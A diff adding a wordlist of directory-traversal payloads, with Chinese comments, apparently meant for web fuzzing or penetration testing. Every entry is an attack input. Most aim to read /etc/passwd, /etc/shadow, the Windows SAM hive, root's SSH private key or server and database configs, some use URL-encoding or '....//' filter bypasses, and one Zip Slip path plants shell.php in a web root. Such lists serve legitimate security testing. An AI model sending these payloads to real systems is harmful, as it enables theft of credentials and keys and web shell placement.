@@ -1,0 +1,24 @@
+# 目录穿越 - 读取 Linux 密码文件
+../../../../etc/passwd
+# 目录穿越 - 读取 Windows SAM 注册表文件
+..\..\..\..\windows\system32\config\SAM
+# 目录穿越 - 读取 Nginx 站点配置文件
+../../../etc/nginx/sites-enabled/default
+# 目录穿越 - 读取 root 用户 SSH 私钥
+../../../../root/.ssh/id_rsa
+# 目录穿越 - 读取 Web 应用数据库配置文件
+../../../var/www/html/config/database.php
+# 目录穿越 - URL 编码绕过过滤
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+# 目录穿越 - 压缩备份文件下载
+../../../var/backups/website.tar.gz
+# 目录穿越 - Nginx 配置别名穿越读取敏感文件
+../aliased/../../../etc/shadow
+# 目录穿越 - Zip Slip 压缩包路径穿越
+../../../../var/www/html/shell.php
+# 目录穿越 - Tomcat WAR 部署目录穿越
+../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
+# 目录穿越 - Windows 大小写绕过
+..\..\..\..\Program Files\Apache\conf\httpd.conf
+# 目录穿越 - 路径规范化绕过 (....//)
+....//....//....//etc/passwd
